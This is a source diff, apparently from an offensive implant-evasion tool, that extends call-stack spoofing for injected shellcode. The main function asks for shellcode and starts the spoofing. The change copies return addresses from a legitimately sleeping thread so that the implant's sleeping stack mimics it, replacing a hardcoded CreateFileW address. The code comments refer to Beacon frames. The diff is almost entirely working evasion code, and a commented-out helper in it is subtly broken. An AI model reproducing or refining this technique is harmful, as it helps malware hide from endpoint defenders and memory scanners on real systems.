@@ -112,7 +112,7 @@ bool hookSleep()
     return true;
 }
 
-void walkCallStack(HANDLE hThread, CallStackFrame* frames, size_t maxFrames, size_t* numOfFrames, bool onlyBeaconFrames /*= false*/)
+void walkCallStack(HANDLE hThread, CallStackFrame* frames, size_t maxFrames, size_t* numOfFrames, bool onlyBeaconFrames, size_t framesToPreserve)
 {
     CONTEXT c = { 0 };
     STACKFRAME64 s = { 0 };
@@ -217,7 +217,7 @@ void walkCallStack(HANDLE hThread, CallStackFrame* frames, size_t maxFrames, siz
         // Skip first two frames as they most likely link back to our callers - and thus we can't spoof them:
         // MySleep(...) -> spoofCallStack(...) -> ...
         //
-        if (Frame < Frames_To_Preserve) 
+        if (Frame < framesToPreserve)
             continue;
 
         bool skipFrame = false;
@@ -267,14 +267,23 @@ void spoofCallStack(bool overwriteOrRestore)
     {
         for (size_t i = 0; i < numOfFrames; i++)
         {
+            if (i > g_stackTraceSpoofing.mimickedFrames)
+            {
+                CallStackFrame frame = { 0 };
+                g_stackTraceSpoofing.spoofedFrame[g_stackTraceSpoofing.spoofedFrames++] = frame;
+                break;
+            }
+
             auto& frame = frames[i];
+            auto& mimicframe = g_stackTraceSpoofing.mimicFrame[i];
 
             if (g_stackTraceSpoofing.spoofedFrames < MaxStackFramesToSpoof)
             {
                 //
                 // We will use CreateFileW as a fake return address to place onto the thread's frame on stack.
                 //
-                frame.overwriteWhat = (ULONG_PTR)::CreateFileW;
+                //frame.overwriteWhat = (ULONG_PTR)::CreateFileW;
+                frame.overwriteWhat = (ULONG_PTR)mimicframe.retAddr;
 
                 //
                 // We're saving original frame to later use it for call stack restoration.
@@ -445,6 +454,40 @@ bool injectShellcode(std::vector<uint8_t>& shellcode, HandlePtr &thread)
     return (NULL != thread.get());
 }
 
+/*
+void _acquireLegitimateThreadStack(LPVOID param)
+{
+    ULONG_PTR lowLimit = 0, highLimit = 0;
+    ULONG stackSize = highLimit - lowLimit;
+    GetCurrentThreadStackLimits(&lowLimit, &highLimit);
+    
+    g_stackTraceSpoofing.legitimateStackContents.resize(stackSize, 0);
+    memcpy(g_stackTraceSpoofing.legitimateStackContents.data(), (const void*)lowLimit, stackSize);
+}
+*/
+
+bool acquireLegitimateThreadStack()
+{
+    CallStackFrame frames[MaxStackFramesToSpoof] = { 0 };
+    size_t numOfFrames = 0;
+
+    HandlePtr secondThread(::CreateThread(
+        NULL,
+        0,
+        (LPTHREAD_START_ROUTINE)::Sleep,
+        (LPVOID)INFINITE,
+        0,
+        0
+    ), &::CloseHandle);
+
+    Sleep(1000);
+
+    walkCallStack(secondThread.get(), g_stackTraceSpoofing.mimicFrame, _countof(g_stackTraceSpoofing.mimicFrame), &g_stackTraceSpoofing.mimickedFrames, false, 0);
+
+    return g_stackTraceSpoofing.mimickedFrames > 0;
+}
+
+
 int main(int argc, char** argv)
 {
     if (argc < 3)
@@ -469,6 +512,12 @@ int main(int argc, char** argv)
         if (!initStackSpoofing())
         {
             log("[!] Could not initialize stack spoofing!");
+            return 1;
+        }
+
+        if (!acquireLegitimateThreadStack())
+        {
+            log("[!] Could not acquire legitimate thread's stack.");
             return 1;
         }
 
